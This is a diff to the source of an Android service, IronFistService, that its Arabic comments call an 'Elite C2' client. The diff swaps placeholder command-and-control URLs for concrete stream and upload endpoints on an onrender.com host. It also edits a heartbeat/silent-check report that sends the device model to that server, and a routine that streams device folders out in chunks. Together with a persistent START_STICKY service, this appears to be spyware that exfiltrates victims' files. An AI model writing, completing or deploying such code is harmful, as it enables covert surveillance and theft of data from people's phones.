@@ -34,9 +34,9 @@ class IronFistService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
-    // روابط سيرفر القبضة الفولاذية Elite C2
-    private val C2_STREAM_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/stream"
-    private val C2_INGEST_URL = "https://your-iron-fist-server.onrender.com/api/v4/iron/ingest"
+    // روابط سيرفر القبضة الفولاذية Elite C2 المرتبطة بسيرفرك على Render
+    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
+    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
     private var lastHeartbeatSent = 0L
 
     override fun onCreate() {
@@ -82,7 +82,7 @@ class IronFistService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Elite Active] $nodeModel (السلطان ناصر دين الله الكلعي)\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Elite Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -112,7 +112,7 @@ class IronFistService : Service() {
         return START_STICKY
     }
 
-    // هندسة الضغط الفوري بأجزاء 1GB مع تنظيف الكاش والذاكرة المؤقتة تماماً أولاً بأول
+    // هندسة الضغط الفوري بأجزاء مع تنظيف الكاش والذاكرة المؤقتة تماماً أولاً بأول
     private fun streamFolderIronFist(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
         try {
             val dir = File(targetDirPath)
